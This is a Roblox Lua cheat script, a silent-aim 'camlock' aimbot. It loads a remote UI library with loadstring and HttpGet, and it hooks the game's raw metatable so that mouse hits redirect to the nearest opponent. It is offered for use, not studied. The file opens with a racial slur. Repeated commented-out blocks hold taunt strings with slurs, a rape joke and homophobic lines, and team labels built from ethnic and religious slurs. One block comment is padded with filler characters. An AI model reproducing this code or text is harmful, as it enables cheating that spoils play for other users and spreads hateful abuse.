--DROP THE WOO NIGGA




getgenv().DNS = {
    Silent = {
        Enabled = true,
        Part = "HumanoidRootPart",
        Pred = 0.119,
        ClosestPart = true,
    },
    FOV = {
        Visible = false,
        Radius = 20
    },
    Tracer = {
        Key = "C",
        Enabled = false,
        Pred = 0.01,
        Part = "HumanoidRootPart",
        Smoothness = 0.009
    },
    Misc = {
        UnlockedOnDeath = true,
        Shake = false,
        ShakeValue = 0.58
    },
}

local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/matas3535/PoopLibrary/main/Library.lua"))() -- Could Also Save It In Your Workspace And Do loadfile("Library.lua")()
 
local Window = Library:New({Name = ",_, | 20 CAMLOCK | PRIVATE", Size = Vector2.new(492, 598), Accent = Color3.fromRGB(160, 25, 240)})
--
local Aimbot = Window:Page({Name = "Aimbot"})
local Settings = Window:Page({Name = "Settings"})
--
    local uwuAimbot = Aimbot:Section({Name = "Main", Side = "Left"})
local uwuMisc = Aimbot:Section({Name = "Misc", Side = "Right"})
local uwuSettings = Aimbot:Section({Name = "Settings", Side = "Left"})
--
local Settings_Main = Settings:Section({Name = "Main", Side = "Left"})
-- // Aimbot
uwuAimbot:Toggle({
Name = "Enabled",
Default = false,
Pointer = "AimbotMain_Enabled",
Callback = function(v)
print(v)
getgenv().DNS.Tracer.Enabled = v  
    
end
})

uwuAimbot:Toggle({
Name = "ShowFov",
Default = false,
Pointer = "AimbotMain_Enabled",
Callback = function(v)
print(v)
getgenv().DNS.FOV["Visible"] = v  
        
end
})

uwuMisc:Toggle({
Name = "Shake",
Default = false,
Pointer = "Shake_Enabled",
Callback = function(v)
print(v)
getgenv().DNS.Misc.Shake = v  
            
end
})

uwuMisc:Toggle({
Name = "UnlockOnDeath",
Default = false,
Pointer = "UnlockOnDeath_Enabled",
Callback = function(v)
print(v)
getgenv().DNS.Misc.UnlockedOnDeath = v  
                
end
})

uwuSettings:Slider({Name = "Smoothness",
Minimum = 0.001,
Maximum = 1.5,
Default = 0.014,
Decimals = 0.001,
Pointer = "AimbotMain_Smoothness",
Callback = function(v)
getgenv().DNS.Tracer.Smoothness = v
 
end  
})

uwuSettings:Slider({Name = "FOV Radius",
Minimum = 0.01,
Maximum = 100,
Default = 15.5,
Decimals = 0.01,
Pointer = "AimbotMain_Radius",
Callback = function(v)
getgenv().DNS.FOV["Radius"] = v  
 
end  
})


uwuSettings:Slider({Name = "Shake Value",
Minimum = 0.5,
Maximum = 100,
Default = 0.58,
Decimals = 0.001,
Pointer = "AimbotMain_Booty",
Callback = function(v)
getgenv().DNS.Misc.ShakeValue = v
  
end  
})

uwuSettings:Slider({Name = "Tracer Prediction",
Minimum = 0.001,
Maximum = 10,
Default = 0.1,
Decimals = 0.001,
Pointer = "AimbotMain_Booty",
Callback = function(v)
getgenv().DNS.Tracer.Pred = v
  
end  
})

uwuSettings:Slider({Name = "Silent Prediction",
Minimum = 0.10,
Maximum = 0.195,
Default = 0.135,
Decimals = 0.001,
Pointer = "AimbotMain_Booty",
Callback = function(v)
getgenv().DNS.Misc.ShakeValue = v
  
end  
})


Settings_Main:ConfigBox({})
Settings_Main:ButtonHolder({Buttons = {{"Load", function() end}, {"Save", function() end}}})
Settings_Main:Label({Name = "Unloading will fully unload\neverything, so save your\nconfig before unloading.", Middle = true})
Settings_Main:Button({Name = "Unload", Callback = function() Window:Unload() end})
-- // Initialisation
Window:Initialize()



--- the code shit

local Players, Client, Mouse, RS, Camera =
game:GetService("Players"),
game:GetService("Players").LocalPlayer,
game:GetService("Players").LocalPlayer:GetMouse(),
game:GetService("RunService"),
game.Workspace.CurrentCamera

local Circle = Drawing.new("Circle")
Circle.Color = Color3.new(1,1,1)
Circle.Thickness = 1

local UpdateFOV = function ()
if (not Circle) then
    return Circle
end
Circle.Visible = getgenv().DNS.FOV["Visible"]
Circle.Radius = getgenv().DNS.FOV["Radius"] * 3
Circle.Position = Vector2.new(Mouse.X, Mouse.Y + (game:GetService("GuiService"):GetGuiInset().Y))
return Circle
end

RS.Heartbeat:Connect(UpdateFOV)

ClosestPlrFromMouse = function()
local Target, Closest = nil, 1/0

for _ ,v in pairs(Players:GetPlayers()) do
    if (v.Character and v ~= Client and v.Character:FindFirstChild("HumanoidRootPart")) then
        local Position, OnScreen = Camera:WorldToScreenPoint(v.Character.HumanoidRootPart.Position)
        local Distance = (Vector2.new(Position.X, Position.Y) - Vector2.new(Mouse.X, Mouse.Y)).Magnitude

        if (Circle.Radius > Distance and Distance < Closest and OnScreen) then
            Closest = Distance
            Target = v
        end
    end
end
return Target
end

local WTS = function (Object)
local ObjectVector = Camera:WorldToScreenPoint(Object.Position)
return Vector2.new(ObjectVector.X, ObjectVector.Y)
end

local IsOnScreen = function (Object)
local IsOnScreen = Camera:WorldToScreenPoint(Object.Position)
return IsOnScreen
end

local FilterObjs = function (Object)
if string.find(Object.Name, "Gun") then
    return
end
if table.find({"Part", "MeshPart", "BasePart"}, Object.ClassName) then
    return true
end
end

local GetClosestBodyPart = function (character)
local ClosestDistance = 1/0
local BodyPart = nil
if (character and character:GetChildren()) then
    for _,  x in next, character:GetChildren() do
        if FilterObjs(x) and IsOnScreen(x) then
            local Distance = (WTS(x) - Vector2.new(Mouse.X, Mouse.Y)).Magnitude
            if (Circle.Radius > Distance and Distance < ClosestDistance) then
                ClosestDistance = Distance
                BodyPart = x
            end
        end
    end
end
return BodyPart
end

local Prey

task.spawn(function ()
while task.wait() do
    if Prey then
        if getgenv().DNS.Silent.Enabled and getgenv().DNS.Silent.ClosestPart == true then
            getgenv().DNS.Silent["Part"] = tostring(GetClosestBodyPart(Prey.Character))
        end
    end
end
end)

local grmt = getrawmetatable(game)
local backupindex = grmt.__index
setreadonly(grmt, false)

grmt.__index = newcclosure(function(self, v)
if (getgenv().DNS.Silent.Enabled and Mouse and tostring(v) == "Hit") then

    Prey = ClosestPlrFromMouse()

    if Prey then
        local endpoint = game.Players[tostring(Prey)].Character[getgenv().DNS.Silent["Part"]].CFrame + (
            game.Players[tostring(Prey)].Character[getgenv().DNS.Silent["Part"]].Velocity * getgenv().DNS.Silent.Pred
        )
        return (tostring(v) == "Hit" and endpoint)
    end
end
return backupindex(self, v)
end)

local CC = game.Workspace.CurrentCamera
local Mouse = game.Players.LocalPlayer:GetMouse()
local Plr
--[[aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa]]



























--[[	local words = {"What the dog doin?","Bro this nigga gay","I raped your dog","Omnikonna is a nn","I love semi","Gugahacks on top!","Bloxsense on top letse go!"} 



	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BackgroundTransparency = 0.800

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.PHealth.Position = UDim2.new(0, 5, 0, 0)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.Plus.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Circle.Transparency = 0.6

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Transparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Buymenu.Base.ImageTransparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item1.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item2.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item3.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item4.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item5.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item6.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item7.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BackgroundColor3 = Color3.fromRGB(35, 35, 35)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.Transparency = 0

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BorderColor3 = Color3.fromRGB(0, 0, 0)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.Transparency = 0.1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BorderSizePixel = 2

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Transparency = 0.6

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Transparency = 0.4

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.BackgroundColor3 = Color3.fromRGB(60, 60, 60)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Blue.Label.Text = "JEWS"

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Red.Label.Text = "ALAHS"

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Color.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Info.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Color.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Info.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BuyZone.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BuyZone.Size = UDim2.new(0, 0, 0, 0)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Size = UDim2.new(0, 206, 0, 40)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Position = UDim2.new(0, 6, 0, 230)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.TextSize = 26.000

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Health.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Armor.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.APlus:Destroy()

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Plus:Destroy()	

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.Transparency = 0.9

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.PlayerPin.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.Controls.Text = words[math.random(1,#words)]

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.TScore.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoClip.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoReserve.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoClip.TextColor3 = Color3.fromRGB(255, 255, 255)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.Slash.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.ImageTransparency = 0.6
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.TextLabel.Font = Enum.Font.Gotham
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.Icon.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Timer.Font = Enum.Font.Gotham
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Back.Visible = false
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Timer.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.TextLabel.Text = "Map vote"
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.TextLabel.Font = Enum.Font.Gotham
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.ImageTransparency = 0.6
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.Defusing.Font = Enum.Font.Gotham
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.Time.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.Performance.Perf.Visible = false

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Transparency = 1
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.BackgroundTransparency = 0.800
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.BackgroundTransparency = 0.800
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.Size = UDim2.new(0, 62, 0, 39)
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.TScore.BackgroundTransparency = 0.800
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Size = UDim2.new(1, 0, 0, 36)
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Bomb.Animate:Destroy()
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Scaler:Destroy()]]
 




--[[	local words = {"What the dog doin?","Bro this nigga gay","I raped your dog","Omnikonna is a nn","I love semi","Gugahacks on top!","Bloxsense on top letse go!"} 



	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BackgroundTransparency = 0.800

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.PHealth.Position = UDim2.new(0, 5, 0, 0)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.Plus.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Circle.Transparency = 0.6

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Transparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Buymenu.Base.ImageTransparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item1.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item2.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item3.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item4.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item5.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item6.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item7.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BackgroundColor3 = Color3.fromRGB(35, 35, 35)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.Transparency = 0

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BorderColor3 = Color3.fromRGB(0, 0, 0)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.Transparency = 0.1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BorderSizePixel = 2

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Transparency = 0.6

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Transparency = 0.4

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.BackgroundColor3 = Color3.fromRGB(60, 60, 60)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Blue.Label.Text = "JEWS"

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Red.Label.Text = "ALAHS"

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Color.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Info.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Color.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Info.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BuyZone.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BuyZone.Size = UDim2.new(0, 0, 0, 0)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Size = UDim2.new(0, 206, 0, 40)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Position = UDim2.new(0, 6, 0, 230)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.TextSize = 26.000

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Health.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Armor.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.APlus:Destroy()

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Plus:Destroy()	

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.Transparency = 0.9

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.PlayerPin.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.Controls.Text = words[math.random(1,#words)]

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.TScore.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoClip.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoReserve.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoClip.TextColor3 = Color3.fromRGB(255, 255, 255)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.Slash.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.ImageTransparency = 0.6
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.TextLabel.Font = Enum.Font.Gotham
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.Icon.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Timer.Font = Enum.Font.Gotham
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Back.Visible = false
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Timer.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.TextLabel.Text = "Map vote"
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.TextLabel.Font = Enum.Font.Gotham
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.ImageTransparency = 0.6
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.Defusing.Font = Enum.Font.Gotham
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.Time.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.Performance.Perf.Visible = false

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Transparency = 1
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.BackgroundTransparency = 0.800
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.BackgroundTransparency = 0.800
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.Size = UDim2.new(0, 62, 0, 39)
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.TScore.BackgroundTransparency = 0.800
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Size = UDim2.new(1, 0, 0, 36)
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Bomb.Animate:Destroy()
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Scaler:Destroy()]]
 


























--[[	local words = {"What the dog doin?","Bro this nigga gay","I raped your dog","Omnikonna is a nn","I love semi","Gugahacks on top!","Bloxsense on top letse go!"} 



	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BackgroundTransparency = 0.800

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.PHealth.Position = UDim2.new(0, 5, 0, 0)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.Plus.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Circle.Transparency = 0.6

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Transparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Buymenu.Base.ImageTransparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item1.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item2.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item3.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item4.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item5.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item6.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item7.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BackgroundColor3 = Color3.fromRGB(35, 35, 35)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.Transparency = 0

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BorderColor3 = Color3.fromRGB(0, 0, 0)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.Transparency = 0.1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BorderSizePixel = 2

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Transparency = 0.6

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Transparency = 0.4

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.BackgroundColor3 = Color3.fromRGB(60, 60, 60)

